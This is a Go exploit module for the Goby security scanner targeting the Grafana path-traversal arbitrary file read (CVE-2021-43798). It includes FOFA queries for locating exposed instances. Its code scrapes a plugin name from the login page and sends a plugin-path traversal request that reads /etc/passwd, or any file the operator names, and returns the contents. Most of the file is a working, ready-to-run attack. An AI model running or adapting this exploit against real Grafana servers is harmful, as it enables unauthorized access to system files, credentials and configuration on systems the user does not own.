package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Grafana Arbitrary File Read vulnerability",
    "Description": "<p>Grafana is a cross-platform, open source data visualization network application platform.</p><p>Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Impact": "Grafana Arbitrary File Read vulnerability",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/grafana/grafana\">https://github.com/grafana/grafana</a></p><p>Temporary repair suggestions:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Grafana",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Grafana 任意文件读取漏洞（CVE-2021-43798）",
            "Description": "<p>Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。<br></p><p>Grafana 存在未授权任意文件读取漏洞。<span style=\"font-size: 16px;\">攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 </span><br></p>",
            "Impact": "<p><span style=\"font-size: 16px;\">攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 </span><br></p>",
            "Recommendation": "<p><span style=\"font-size: 16px;\">目前没有详细的解决方案提供，请关注厂商主页更新：</span><a href=\"https://github.com/grafana/grafana\">https://github.com/grafana/grafana</a><br></p><p>临时修复建议：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Grafana",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Grafana Arbitrary File Read vulnerability",
            "Description": "<p>Grafana is a cross-platform, open source data visualization network application platform.</p><p>Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
            "Impact": "Grafana Arbitrary File Read vulnerability",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/grafana/grafana\" target=\"_blank\">https://github.com/grafana/grafana</a></p><p>Temporary repair suggestions:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.",
            "Product": "Grafana",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(title=\"Grafana\") || (title=\"Grafana\" || body=\"window.grafanabootdata = \")",
    "GobyQuery": "(title=\"Grafana\") || (title=\"Grafana\" || body=\"window.grafanabootdata = \")",
    "Author": "keeeee",
    "Homepage": "https://grafana.com/",
    "DisclosureDate": "2021-12-07",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [
        "CVE-2021-43798"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6850"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/login")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			plugin := ""
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				reg := regexp.MustCompile(`":{"baseUrl":"public/plugins/(.*?)","hideFromList"`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					plugin = result[1]
				}
			}
			cfg = httpclient.NewGetRequestConfig("/public/plugins/" + plugin + "/../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd")
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return regexp.MustCompile(`root:(.*?):0:0:`).MatchString(resp.Utf8Html)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["fileName"].(string)
			cfg := httpclient.NewGetRequestConfig("/login")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			plugin := ""
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`":{"baseUrl":"public/plugins/(.*?)","hideFromList"`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					plugin = result[1]
				}
			}
			cfg = httpclient.NewGetRequestConfig("/public/plugins/" + plugin + "/../../../../../../../../../../../../../../../../../../../../../../../.." + fileName)
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.Utf8Html != "" {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
